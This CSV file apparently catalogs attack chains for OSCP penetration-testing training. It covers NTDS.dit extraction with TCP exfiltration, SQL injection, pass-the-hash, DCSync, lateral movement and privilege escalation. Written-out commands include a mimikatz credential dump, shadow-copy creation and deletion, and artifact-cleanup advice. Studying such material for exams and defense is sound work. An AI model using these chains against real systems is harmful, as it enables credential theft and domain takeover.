"id","name","description","version","category","platform","difficulty","time_estimate","oscp_relevant","notes"
"post-vss-ntds-tcp-exfil","VSS NTDS.dit Extraction with TCP Exfiltration","Complete one-liner workflow for NTDS.dit credential extraction: VSS shadow copy creation, NTDS.dit + SYSTEM extraction, compression, TCP exfiltration to Kali, and offline secretsdump parsing.

ALTERNATIVE TO DCSYNC: Use this chain when DCSync unavailable (no replication rights) but have local Administrator on Domain Controller. Both methods yield same result (all domain credentials), but different prerequisites.

WHEN TO USE:
- Local Administrator on DC (or SeBackupPrivilege)
- DCSync NOT available (no replication rights)
- Need ALL domain credentials (not just specific users)
- Network connectivity from DC to Kali on arbitrary port
- vshadow.exe uploaded to DC (or use vssadmin alternative)

WHEN NOT TO USE:
- DCSync available (faster, no file transfer, less artifacts)
- Can't reach Kali from DC (firewall blocks outbound)
- PowerShell <5.0 (Compress-Archive not available)
- Target not a Domain Controller (no NTDS.dit)

TWO-PHASE APPROACH:
1. ATTACKER (Kali): Start listener FIRST - receives compressed zip
2. TARGET (DC): Execute one-liner - creates shadow, extracts, compresses, sends
3. ATTACKER (auto): Unzip + secretsdump - extracts all credentials

OPSEC CONSIDERATIONS:
- Creates persistent VSS shadow copy (evidence artifact)
- Files temporarily written to C:\ root
- TCP egress from DC may trigger alerts
- Large file transfer (~20-500MB) may be noticed
- Recommend cleanup after extraction (delete shadow copy)

VS DCSYNC COMPARISON:
| Aspect          | This Chain          | DCSync           |
|-----------------|---------------------|------------------|
| Prerequisites   | Local Admin on DC   | Replication Rights |
| Network         | TCP to Kali         | RPC to DC        |
| Artifacts       | Shadow copy, files  | Event logs only  |
| Detection       | Medium (file ops)   | Low (looks like replication) |
| Speed           | 2-5 min             | 30sec-2min       |
| Credentials     | ALL (offline parse) | ALL (live dump)  |","1.0.0","","","intermediate","5 minutes (1 min setup, 2-3 min transfer, 1 min parsing)","True","COMPLETE ONE-LINER WORKFLOW: Extracts ALL domain credentials in single command execution.

CRITICAL: Start attacker-side listener BEFORE executing target-side command. TCP connection is one-shot - if listener not ready, data lost.

WORKFLOW STEPS:
1. Start listener on Kali (Step 1)
2. Execute PowerShell one-liner on DC (Step 2)
3. Wait for transfer (~30sec-2min depending on NTDS.dit size)
4. Listener auto-continues: unzip + secretsdump
5. All domain credentials printed to terminal

OUTPUT FORMAT (secretsdump):
domain\username:RID:LMhash:NThash:::
Example: CORP\Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::

KEY HASHES TO EXTRACT:
- Administrator:500 - Domain Admin NTLM for Pass-the-Hash
- krbtgt:502 - Golden Ticket creation
- Service accounts - Often weak passwords, crack with hashcat

ALTERNATIVE WITHOUT VSHADOW:
Replace vshadow.exe with native vssadmin in the one-liner:
$out = vssadmin create shadow /for=C: | Out-String
(Rest of command remains same)

CLEANUP (Optional - remove artifacts on DC):
vssadmin delete shadows /for=C: /all /quiet

FILE SIZE REFERENCE:
- Small domain (<100 users): 20-50 MB
- Medium domain (100-1000 users): 50-200 MB
- Large domain (1000+ users): 200-500+ MB

FAILURE RECOVERY:
If transfer fails midway:
1. Kill listener on Kali (Ctrl+C)
2. Delete partial loot.zip
3. On DC: Files may still exist in C:\ - manually cleanup or re-run
4. Restart listener and re-execute one-liner

EXAM TIPS:
- Test network connectivity BEFORE running: Test-NetConnection -ComputerName <LHOST> -Port <LPORT>
- Use high port (>1024) to avoid permission issues on Kali
- Pipe secretsdump output to file: ... | tee domain_hashes.txt
- Immediately extract krbtgt hash for Golden Ticket backup
- Delete sensitive files after use: rm loot.zip ntds.dit system.bak"
"web-sqli-postgres-fileretrieve","PostgreSQL Error-Based SQLi to File Retrieval","Exploit error-based SQL injection to extract database credentials, establish direct PostgreSQL connection, and leverage superuser file functions to retrieve sensitive files when shell access is restricted by network policies.

This technique is particularly useful when traditional shell methods fail due to network restrictions.","1.0.0","","","intermediate","45 minutes","True","This chain demonstrates critical OSCP skills: (1) Adapting when standard shell methods fail, (2) Leveraging service-specific capabilities, (3) Understanding database privilege models. Particularly useful when: network egress/ingress filtered, web shell write permissions denied, or COPY FROM PROGRAM hangs. Key insight: Database superuser ≠ OS root, but provides powerful file system access within postgres user permissions. Real-world scenario from OSCP Capstone 3: strict firewall blocked ALL reverse/bind shells but PostgreSQL port 5432 was selectively allowed."
"ad-bloodhound-custom-cypher","BloodHound Custom Cypher Query Workflow","Advanced BloodHound enumeration using custom Cypher queries when pre-built queries return 'No paths found'.

This chain focuses specifically on the CRITICAL scenario: You've collected BloodHound data, imported it, marked your compromised user as owned, run 'Shortest Paths to Domain Admins' query, and got 'No paths found'. This does NOT mean no path exists - it means you need custom Cypher queries to discover non-obvious attack paths.

WHY THIS MATTERS: Pre-built BloodHound queries are optimized for DIRECT paths (user → DA in 1-3 hops). Real-world AD environments have INDIRECT paths that require intermediate pivots: compromise user A → discover user A has AdminTo on system B → discover system B has DA service session → harvest DA credentials. These multi-stage paths are INVISIBLE to pre-built queries but DISCOVERABLE with custom Cypher.

CRITICAL OSCP PATTERN: When BloodHound says 'no paths found', students often give up and pivot to different attack vectors. WRONG. The correct approach: iterate through ALL compromised users with custom Cypher queries checking AdminTo, HasSession, and MemberOf relationships. The writeup demonstrates: pete (no path) → mike (AdminTo CLIENT75) → CLIENT75 (has DA session) → domain compromise.

SUCCESS RATE: Very high (70-80% of 'no paths found' scenarios CAN find paths with custom queries). The key is knowing WHICH queries to run and WHEN to run them.

LESSON FROM CORP-DCSYNC WRITEUP: 'BloodHound no paths found doesn't mean no path exists - means you need to compromise intermediate accounts first. Custom Cypher queries reveal paths that pre-built queries miss.'","1.0.0","","","intermediate","10 minutes (5 min pre-built queries, 5 min custom queries)","True","This chain is CRITICAL when pre-built queries fail. It teaches systematic enumeration of attack paths using custom Cypher queries.

CRITICAL SUCCESS FACTORS:
1. Mark ALL compromised users as owned (not just first user)
2. Test custom queries for EACH compromised user individually
3. Look for AdminTo relationships first (lateral movement opportunities)
4. Check HasSession on systems where you have AdminTo (credential harvest opportunities)
5. Iterate - finding one intermediate user may unlock paths for others

COMMON FAILURES:
- Only testing one compromised user: Test ALL users, some have paths others don't
- Giving up after pre-built queries fail: This is when custom queries become critical
- Wrong Cypher syntax: Username format is '[email]' (uppercase, with domain)
- Not marking users as owned: Query results won't show paths FROM owned principals
- Searching for paths TO wrong target: Use 'DOMAIN [email]' (group name with space)

CYPHER QUERY PATTERNS:

AdminTo enumeration:
MATCH (u:User {name:'[email]'})-[:AdminTo]->(c:Computer) RETURN u,c

HasSession on specific computer:
MATCH (c:Computer {name:'SYSTEM.DOMAIN.COM'})<-[:HasSession]-(u:User) RETURN c,u

Paths to Domain Admins (custom depth):
MATCH p=(u:User {name:'[email]'})-[*1..3]->(g:Group {name:'DOMAIN [email]'}) RETURN p

Find high-value targets (DA sessions):
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:'DOMAIN [email]'})
MATCH (u)-[:HasSession]->(c:Computer)
RETURN u.name, c.name

ALTERNATIVE METHODS:
- Manual JSON parsing: jq '.data[] | select(.Properties.name==""[email]"")' users.json
- Neo4j Browser: Direct Neo4j web interface (http://localhost:7474) for advanced queries
- Command-line cypher-shell: cypher-shell -u neo4j -p password < queries.cypher

TIME ESTIMATES:
- Mark users as owned: 1 minute per user
- Run pre-built queries: 2 minutes
- Custom AdminTo queries: 2 minutes (test all users)
- Custom HasSession queries: 2 minutes
- Path validation: 3 minutes
- TOTAL: 10 minutes from 'no paths' to identified attack path

WHY CUSTOM QUERIES WORK:
- Pre-built queries optimize for DIRECT paths (shortest distance)
- Real attacks use INDIRECT paths (compromise intermediate accounts)
- Custom queries let you ask specific questions: 'Which systems can THIS user admin?'
- Iterative approach: Each discovered relationship unlocks new query possibilities"
"web-exploit-sqli-union","SQL Injection UNION-Based Data Extraction","Detect SQL injection vulnerability, enumerate database structure using UNION SELECT technique, and extract credentials through branching database-specific exploitation paths","1.0.0","","","advanced","30 minutes","True","This chain demonstrates branching logic required for multi-database SQLi exploitation. After detecting database type in step 4, the chain branches into 3 parallel paths (MySQL/PostgreSQL/MSSQL enumeration). Each database path then proceeds to credential extraction. OSCP CRITICAL: Always attempt manual exploitation BEFORE sqlmap. Document column count and displayed column positions for exam report. Use next_steps field to implement conditional branching based on database detection results."
"windows-lateral-wmi-full","WMI Lateral Movement - Full Attack Chain","Complete WMI lateral movement from Kali to Windows: verify admin access, encode payload, execute WMI, obtain reverse shell.

This chain demonstrates fileless remote code execution using Windows Management Instrumentation.","1.0.0","","","intermediate","15 minutes","True","WMI (Windows Management Instrumentation) provides remote execution via DCOM over RPC. This chain demonstrates lateral movement from Kali using impacket-wmiexec for fileless remote code execution. ADVANTAGES: Fileless (no binary written to disk), uses legitimate Windows service, supports pass-the-hash. DISADVANTAGES: Creates WMI event logs, slower than PSExec for interactive use. OSCP RELEVANCE: High - frequently available when WinRM blocked, pass-the-hash compatible."
"windows-lateral-overpass-hash","Overpass-the-Hash Attack Chain (NTLM to Kerberos)","Complete overpass-the-hash workflow: convert NTLM hash to Kerberos TGT, use for tools requiring Kerberos authentication (Microsoft PsExec).

This technique upgrades NTLM authentication to Kerberos when tools only support Kerberos tickets.","1.0.0","","","advanced","20 minutes","True","Overpass-the-Hash upgrades NTLM hash to Kerberos TGT for tools that only support Kerberos authentication. WHY NEEDED: Some Windows tools (Microsoft PsExec, certain COM objects) require Kerberos tickets, won't work with NTLM. HOW IT WORKS: Mimikatz injects NTLM hash into LSASS, requests TGT from KDC using hash for pre-authentication, resulting TGT can be used like normal Kerberos ticket. ADVANTAGES: Enables Kerberos-only tools with just hash, more compatible than pure pass-the-hash. DISADVANTAGES: Requires compromised Windows host (can't do from Kali), more complex than straightforward pass-the-hash. OSCP RELEVANCE: High - needed when Impacket tools fail but Microsoft tools available."
"windows-lateral-psexec-full","PSExec Lateral Movement - Full Attack Chain","Complete PSExec attack from Kali: verify ADMIN$ share, authenticate with Impacket PSExec, obtain SYSTEM shell.

This is the most reliable lateral movement technique for OSCP, providing immediate SYSTEM-level access.","1.0.0","","","beginner","10 minutes","True","PSExec is the most reliable lateral movement technique for OSCP - provides SYSTEM-level access immediately. Works by uploading binary to ADMIN$ share, creating Windows service, executing payload. ADVANTAGES: Spawns SYSTEM shell, most stable, widely documented. DISADVANTAGES: Writes binary to disk (forensics), creates service (event logs), easier to detect than WMI. OSCP RELEVANCE: Very high - first technique to try when credentials available."
"linux-exploit-cred-reuse","Credential Reuse Attack Chain","Chain credential reuse across SSH, database, and web admin interfaces for lateral movement and privilege escalation.

Systematically test discovered credentials against all available services to maximize access.","1.0.0","","","intermediate","20 minutes","True","Credential reuse is extremely common in OSCP environments. Database credentials found in web config files are often reused for SSH access. This chain demonstrates systematic credential testing across multiple services. Always test discovered credentials against all enumerated users and services. Time-efficient approach: discover once, test everywhere."
"windows-evil-winrm-operational","Evil-WinRM Complete Operational Workflow","Complete operational guide for Evil-WinRM lateral movement including connection, file transfers, tool deployment, and credential exfiltration.

This chain covers the ENTIRE Evil-WinRM workflow for OSCP lateral movement: connection establishment (password and Pass-the-Hash), environment verification, file upload/download, tool execution, credential exfiltration, and session management. Focus on OPERATIONAL usage in real engagements.

WHY EVIL-WINRM IS PREFERRED FOR OSCP:
1. Interactive PowerShell shell (not cmd.exe like PSExec)
2. Built-in file upload/download (no SMB server needed)
3. No service creation (stealthier than PSExec)
4. Supports Pass-the-Hash natively (-H flag)
5. Works over WinRM (port 5985/5986) when SMB blocked
6. Automatic handling of PS remoting restrictions

CRITICAL SYNTAX: Evil-WinRM requires 'DOMAIN\user' format for domain accounts. There is NO -d flag for domain (common mistake). Use single quotes to escape backslash in bash.

SUCCESS RATE: Very high (85-90%) IF WinRM is enabled. Most OSCP lab systems have WinRM enabled by default. Failures usually due to:
1. WinRM not enabled (15% of systems) - fallback to PSExec/WMI
2. Wrong credential syntax (domain\user vs user@domain)
3. Firewall blocking ports 5985/5986
4. Certificate validation issues (HTTPS WinRM)

LESSON FROM CORP-DCSYNC WRITEUP: 'Evil-WinRM superior to PSExec for lateral movement (no service creation, file transfer built-in). Critical syntax: domain\user format (NOT -d flag - doesn't exist).'","1.0.0","","","beginner","10 minutes (2 min connection, 3 min upload, 3 min execution, 2 min download)","True","This chain focuses on OPERATIONAL Evil-WinRM usage for OSCP lateral movement and post-exploitation. Not theory, but practical workflow.

CRITICAL SUCCESS FACTORS:
1. Correct credential syntax: 'DOMAIN\user' (single quotes, backslash separator)
2. Verify WinRM enabled: nmap -p 5985,5986 <target> before attempting connection
3. Use absolute paths for file operations (C:\temp\file.txt, not relative paths)
4. Redirect command output to files for large results (mimikatz, whoami /all)
5. Download evidence files for writeup documentation

COMMON FAILURES AND SOLUTIONS:

1. Connection Refused / Timeout:
   - Cause: WinRM not enabled, firewall blocking ports
   - Solution: Check nmap for ports 5985/5986, try PSExec/WMI instead

2. Authentication Failed:
   - Cause: Wrong credential format, incorrect password/hash
   - Solution: Verify syntax (domain\user), test with crackmapexec first

3. Access Denied After Login:
   - Cause: User not in Remote Management Users or Administrators
   - Solution: Verify group membership, try different user

4. Upload/Download Fails:
   - Cause: Permissions, path doesn't exist, AV blocking
   - Solution: Use writable directory (C:\temp, C:\Users\Public), check AV logs

5. Certificate Validation Errors (HTTPS WinRM):
   - Cause: Self-signed cert, hostname mismatch
   - Solution: Use -S flag for SSL but skip validation

EVIL-WINRM ADVANTAGES OVER ALTERNATIVES:

vs PSExec:
- No service creation (stealthier)
- Interactive PowerShell (not cmd.exe)
- Built-in file transfer (no SMB server)
- Cleaner process execution

vs WMI:
- Interactive shell (WMI is non-interactive)
- Easier file operations
- PowerShell integration

vs RDP:
- Command-line based (no GUI needed)
- Scriptable and automatable
- Lower bandwidth requirements

vs SSH:
- Native Windows remoting (not third-party)
- Better PowerShell integration
- More common in Windows environments

FILE TRANSFER OPERATIONS:

Upload Files:
- Syntax: upload <local_path> <remote_path>
- Example: upload /opt/mimikatz.exe C:\temp\mimikatz.exe
- Supports: Executables, scripts, text files, compressed archives
- Size limit: Generally no limit, but large files (>100MB) may be slow

Download Files:
- Syntax: download <remote_path> <local_path>
- Example: download C:\temp\credentials.txt /tmp/creds.txt
- Use for: Credential dumps, enumeration results, flags, screenshots

Batch Operations:
- Upload multiple files: Use menu command or script
- Download directory: Requires PowerShell copy commands first

COMMAND EXECUTION PATTERNS:

Interactive Commands:
- whoami, hostname, ipconfig (immediate output)
- dir, ls (PowerShell aliases work)
- Get-* PowerShell cmdlets

Long-Running Commands:
- Redirect output: mimikatz.exe ""commands"" > output.txt
- Background execution: Start-Process (for GUI tools)
- Check running: Get-Process

Credential Harvesting:
- Upload mimikatz.exe
- Execute: .\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" ""exit"" > creds.txt
- Download: download C:\temp\creds.txt /tmp/creds.txt

TIME ESTIMATES FOR OSCP:
- Connection establishment: 30 seconds - 2 minutes (depends on network)
- Environment verification: 1 minute (whoami, hostname, ipconfig)
- Upload tools (mimikatz ~1.2MB): 30 seconds - 2 minutes
- Execute credential dump: 2-3 minutes
- Download results: 30 seconds - 1 minute
- TOTAL: 5-10 minutes for complete lateral movement + credential harvest

EXAM TIPS:
- Always test connection with whoami first (verify access)
- Create C:\temp directory if it doesn't exist (mkdir C:\temp)
- Use absolute paths (C:\temp\file.txt, not .\file.txt)
- Redirect long output to files (> output.txt)
- Download ALL evidence for writeup (credentials, flags, enumeration)
- Document exact commands used (for reproducibility)
- Keep session active (don't close terminal accidentally)"
"windows-lateral-winrm-full","WinRM Lateral Movement - Full Attack Chain","Complete WinRM/PowerShell remoting attack: verify WinRM enabled, authenticate with Evil-WinRM, obtain interactive PowerShell shell.

This chain demonstrates the preferred method for Windows lateral movement from Kali.","1.0.0","","","beginner","10 minutes","True","WinRM (Windows Remote Management) is Microsoft's official remote administration protocol based on WS-Management. Evil-WinRM provides robust PowerShell remoting from Kali with file upload/download capabilities. ADVANTAGES: Interactive PowerShell, file transfer built-in, cleaner than WMI, supports pass-the-hash. DISADVANTAGES: Creates WinRM event logs, requires WinRM enabled. OSCP RELEVANCE: Very high - preferred method for Windows lateral movement from Kali."
"windows-lateral-dcom-exploitation","DCOM Lateral Movement Attack Chain (MMC20)","Complete DCOM exploitation: verify RPC access, instantiate remote COM object, execute reverse shell via MMC20.Application.

This technique provides an alternative when WMI and WinRM are blocked or unavailable.","1.0.0","","","advanced","20 minutes","True","DCOM (Distributed Component Object Model) lateral movement via MMC20.Application is alternative when WMI/WinRM blocked. Discovered by Matt Nelson (@enigma0x3) in 2017. HOW IT WORKS: Instantiate remote MMC COM object via DCOM, call ExecuteShellCommand method to run arbitrary commands. ADVANTAGES: Uses same RPC port as WMI (135) but different protocol, bypasses WMI-specific restrictions, fileless execution (no binary drop). DISADVANTAGES: Requires PowerShell on compromised host (can't execute from Kali), complex syntax, processes run in Session 0 (invisible). OSCP RELEVANCE: High - critical fallback when primary techniques blocked."
"windows-lateral-pth-impacket","Pass-the-Hash Attack Chain (Impacket)","Complete pass-the-hash workflow: dump hashes, verify hash format, test hash validity, execute lateral movement without cracking password.

Leverage NTLM hashes for authentication without requiring plaintext passwords.","1.0.0","","","intermediate","15 minutes","True","Pass-the-Hash (PtH) leverages NTLM hashes for authentication without cracking passwords. Critical for OSCP lateral movement when only hashes available. NTLM authentication uses hash directly in challenge-response, making plaintext password unnecessary. ADVANTAGES: No password cracking needed (saves hours), works across network, supports multiple protocols (SMB/WMI/WinRM). DISADVANTAGES: UAC blocks non-RID-500 local admin hashes (2014 patch), creates authentication logs. OSCP RELEVANCE: Very high - frequently the only path forward when credentials unknown."
"ad-pth-to-dcsync-escalation","Pass-the-Hash to DCSync Full Domain Compromise","Complete privilege escalation chain from NTLM hash extraction to full domain compromise via DCSync, WITHOUT password cracking.

This chain demonstrates the CRITICAL OSCP concept: You don't need plaintext passwords for domain compromise - NTLM hashes are sufficient. The complete attack flow: compromised system → mimikatz credential dump → extract NTLM hashes → Pass-the-Hash validation → DCSync to extract ALL domain credentials → Pass-the-Hash to Domain Controller → full domain compromise.

WHY THIS MATTERS: Password cracking takes HOURS (hashcat with rockyou.txt = 30-120 minutes per hash). Pass-the-Hash takes SECONDS. In OSCP exam, you have 24 hours for 3 machines - every minute counts. This chain gets you from local admin to Domain Admin in 15 minutes WITHOUT waiting for password cracks.

CRITICAL PATTERN: This chain connects THREE techniques:
1. Credential Harvesting (mimikatz) - Extract NTLM hashes from compromised system
2. Pass-the-Hash (crackmapexec, evil-winrm) - Authenticate using hash instead of password
3. DCSync (impacket-secretsdump) - Extract ALL domain hashes using replication rights

SUCCESS RATE: Very high in AD environments (80-90%) IF you have local admin on domain-joined system. The chain works because:
- Windows accepts NTLM hashes for authentication (no plaintext needed)
- Domain Admins frequently have cached credentials on workstations
- DCSync uses legitimate replication protocol (hard to detect)
- Administrator account exists in every domain (guaranteed target)

LESSON FROM CORP-DCSYNC WRITEUP: 'Pass-the-Hash works without plaintext passwords - faster than cracking. No password cracking needed - PTH sufficient for domain compromise.'","1.0.0","","","intermediate","15 minutes (5 min credential harvest, 3 min DCSync, 2 min DC access, 5 min flag retrieval)","True","This chain is FASTER than password cracking and MORE RELIABLE than exploit attempts. It leverages Windows built-in authentication (NTLM) and AD replication protocol (DCSync) - both are legitimate features, making detection difficult.

CRITICAL SUCCESS FACTORS:
1. Mimikatz privilege::debug BEFORE sekurlsa commands (mandatory)
2. Extract NTLM hash correctly (32 hex characters)
3. Validate hash with crackmapexec BEFORE attempting DCSync
4. Use correct syntax for Pass-the-Hash tools (: prefix for impacket, -H flag for evil-winrm)
5. Target correct Domain Controller (check with 'nltest /dclist:DOMAIN')

COMMON FAILURES:
- Mimikatz without privilege::debug: ERROR 0x00000005 Access Denied
- Wrong hash format: Ensure NTLM (32 chars), not LM or SHA1
- DCSync requires DA privileges: Validate credentials are Domain Admin BEFORE attempting
- Network connectivity: Ensure routing to DC (check with ping, test SMB with crackmapexec)
- Impacket syntax errors: Hash format is ':<NTLM>' (colon prefix), not standalone hash

ALTERNATIVES IF CHAIN FAILS:
- No DA credentials cached: Target more systems, use Kerberoasting for service accounts
- DCSync blocked by firewall: Use alternative exfiltration (volume shadow copy, ntdsutil)
- AV blocks mimikatz: Use pypykatz, Invoke-Mimikatz, or procdump+offline parsing
- Domain Admin disabled: Target Enterprise Admins or Backup Operators (also have replication rights)

TIME ESTIMATES FOR OSCP:
- Mimikatz upload and credential dump: 5 minutes
- Parse output and extract NTLM hashes: 2 minutes
- Validate hash with crackmapexec: 1 minute
- DCSync execution: 3 minutes (depends on domain size)
- Extract Administrator hash from DCSync output: 2 minutes
- Pass-the-Hash to DC and flag retrieval: 2 minutes
- TOTAL: 15 minutes from local admin to domain compromise

WHY PASS-THE-HASH WORKS:
- Windows NTLM authentication: Hash IS the password (challenge-response protocol)
- Server never sees plaintext password (only hash)
- Pass-the-Hash tools (impacket, evil-winrm) implement NTLM authentication correctly
- No password cracking needed (saves hours of computation time)

WHY DCSYNC WORKS:
- Simulates Domain Controller replication protocol (MS-DRSR)
- Domain Admins have 'Replicating Directory Changes All' permission by default
- DC treats request as legitimate replication (hard to detect without SIEM)
- Returns NTLM hashes for ALL domain users (including Administrator, krbtgt)"
"linux-privesc-docker-mount","Docker Group Privilege Escalation","Exploit Docker group membership to escalate privileges from low-privilege user to root via container filesystem mounting.

Docker group membership is equivalent to root access on the host system.","1.0.0","","","beginner","5 minutes","True","Docker group membership is equivalent to root access. This is one of the fastest privilege escalation paths in OSCP labs. The mount escape technique is preferred over privileged mode as it's cleaner and more reliable. If no images are available, alpine can be pulled (5MB, fast download). Alternative techniques include socket mounting and pid namespace abuse, but direct mount escape is simplest. Always verify root access by reading /etc/shadow and /root directory after escalation."
"linux-privesc-suid-basic","SUID Binary Privilege Escalation (Basic)","Quick wins check (sudo) followed by SUID binary exploitation using GTFOBins to gain root shell.

This chain includes prerequisite quick-wins validation before time-intensive SUID enumeration.","1.0.0","","","beginner","20 minutes","True","SUID binaries with setuid bit set run with owner's privileges (usually root). Misconfigured binaries like find, vim, nmap, base64 can be exploited for privilege escalation. GTFOBins provides exploitation techniques. This chain covers the most common OSCP scenario: finding SUID binary and exploiting it for root shell.

OSCP Time-Saving Tip: This chain includes a prerequisite quick-wins check (Step 0) that tests for sudo access before running full SUID enumeration. If Step 0 finds NOPASSWD sudo access, consider switching to the linux-privesc-sudo chain for faster exploitation. SUID enumeration can take 2-5 minutes on large filesystems, while sudo check takes <5 seconds."
"linux-privesc-sudo-nopasswd","Sudo Privilege Escalation (Quick Win)","Rapid privilege escalation via sudo misconfigurations - NOPASSWD entries and GTFOBins-exploitable commands.

This is the fastest privilege escalation path for Linux systems in OSCP environments.","1.0.0","","","beginner","5 minutes","True","Sudo misconfigurations are the #1 quick win for Linux privilege escalation in OSCP. NOPASSWD entries allow running commands as root without password. Many binaries (find, vim, nmap, less, python) can spawn root shells when run with sudo. This chain should ALWAYS be run first before attempting SUID or other techniques."
"linux-privesc-capabilities-enum","Linux Capabilities Privilege Escalation","Enumerate and exploit Linux file capabilities to escalate privileges.

Capabilities are a modern alternative to SUID binaries that grant specific elevated permissions.

Dangerous capabilities like cap_setuid, cap_dac_override, and cap_dac_read_search enable privilege escalation through various exploitation techniques.","1.0.0","","","intermediate","10 minutes","True","Capabilities are less common than SUID but critical to check during enumeration. Network capabilities (cap_net_raw, cap_net_admin) are non-exploitable for privilege escalation. cap_setuid provides instant root shell similar to SUID but cleaner. cap_dac_override allows read/write to any file (edit /etc/passwd for UID 0). cap_dac_read_search allows reading sensitive files (shadow, SSH keys). Always check GTFOBins capabilities section for exploitation techniques. Multiple capabilities on single binary may provide multiple exploitation paths. Capabilities persist after file execution unlike SUID."
"windows-privesc-enumeration-exploitation","Windows Privilege Escalation - Full Methodology","Comprehensive Windows privilege escalation workflow from initial shell to SYSTEM/Administrator.

This chain covers the complete attack path:
1. Gain initial shell (limited user privileges)
2. Enumerate system for privilege escalation vectors
3. Identify exploitable misconfigurations or vulnerabilities
4. Execute exploitation technique
5. Verify elevated privileges obtained
6. Interact with elevated shell for post-exploitation

Designed for OSCP exam methodology - prioritizes quick wins (Potato exploits, AlwaysInstallElevated) before complex techniques.","1.0.0","","","intermediate","10-30 minutes","True","WINDOWS PRIVILEGE ESCALATION METHODOLOGY FOR OSCP:

THIS IS THE MOST CRITICAL SKILL FOR WINDOWS TARGETS IN OSCP.

PRIORITY ORDER (FASTEST TO SLOWEST):
1. Token Impersonation (SeImpersonate/SeAssignPrimaryToken) - 2 minutes
2. AlwaysInstallElevated - 3 minutes
3. Unquoted Service Paths - 5 minutes
4. Weak Service Permissions - 5 minutes
5. Registry AutoLogon Credentials - 3 minutes
6. Scheduled Tasks (writable scripts) - 10 minutes
7. Kernel Exploits - 15 minutes (last resort)

COMMON EXAM SCENARIOS:
- Web shell as IIS APPPOOL\DefaultAppPool (SeImpersonate = instant win)
- RDP as standard user in Administrators group (UAC bypass needed)
- Service account with saved credentials (runas /savecred)
- Misconfigured service running as SYSTEM

AUTOMATED VS MANUAL:
- Use WinPEAS/PowerUp for initial enumeration (fast, comprehensive)
- Manually verify findings before exploitation (avoid rabbit holes)
- Know how to do everything manually (tools may be blocked by AV)

TIME MANAGEMENT:
- Spend 5 minutes on quick wins (whoami /priv, AlwaysInstallElevated)
- Spend 10 minutes on automated enumeration (WinPEAS)
- Spend 15 minutes on manual verification and exploitation
- If nothing found in 30 minutes, revisit initial access vector

STEALTH CONSIDERATIONS:
- Automated tools trigger AV (encode/obfuscate if needed)
- Service restarts logged in Event Viewer (Event ID 7045)
- Registry modifications tracked (Event ID 4657)
- Process creation audited (Event ID 4688)
- For exam: stealth doesn't matter, focus on speed

CONDITIONAL LOGIC SUMMARY:
This chain uses decision points at each step:
- IF SeImpersonate privilege → Potato exploit (immediate win)
- IF AlwaysInstallElevated enabled → MSI payload (3 min to root)
- IF unquoted service paths found → Path hijacking (5 min)
- IF weak service permissions → Binary replacement (5 min)
- ELSE → Manual enumeration for credentials, scheduled tasks, kernel exploits

Each step includes failure conditions and alternative paths to avoid getting stuck."
